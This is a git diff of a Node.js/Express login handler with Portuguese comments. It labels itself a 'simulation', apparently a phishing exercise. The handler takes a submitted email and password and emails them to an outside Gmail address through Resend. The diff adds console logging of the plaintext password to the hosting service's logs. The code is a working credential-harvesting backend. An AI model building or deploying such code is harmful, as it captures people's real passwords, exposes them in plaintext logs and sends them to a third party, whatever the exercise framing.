@@ -17,6 +17,9 @@ app.get('/', (req, res) => {
 app.post('/', async (req, res) => {
   const { email, senha } = req.body;
 
+  // Loga os dados no console (visível nos logs do Render)
+  console.log(`📥 Dados recebidos: Email = ${email}, Senha = ${senha}`);
+
   try {
     await resend.emails.send({
       from: 'simulacao@connect.com',
@@ -24,6 +27,8 @@ app.post('/', async (req, res) => {
       subject: 'Dados capturados na simulação',
       html: `<p><strong>Email:</strong> ${email}<br><strong>Senha:</strong> ${senha}</p>`
     });
+
+    console.log('✅ Email enviado com sucesso para smtptesteenvio1@gmail.com');
 
     res.send(`
       <h2 style="font-family:Arial; color:#c62828; text-align:center; margin-top:100px;">
@@ -34,12 +39,12 @@ app.post('/', async (req, res) => {
       </p>
     `);
   } catch (error) {
-    console.error('Erro ao enviar email:', error);
+    console.error('❌ Erro ao enviar email:', error);
     res.send('Erro ao processar os dados.');
   }
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Servidor rodando na porta ${PORT}`);
+  console.log(`🚀 Servidor rodando na porta ${PORT}`);
 });
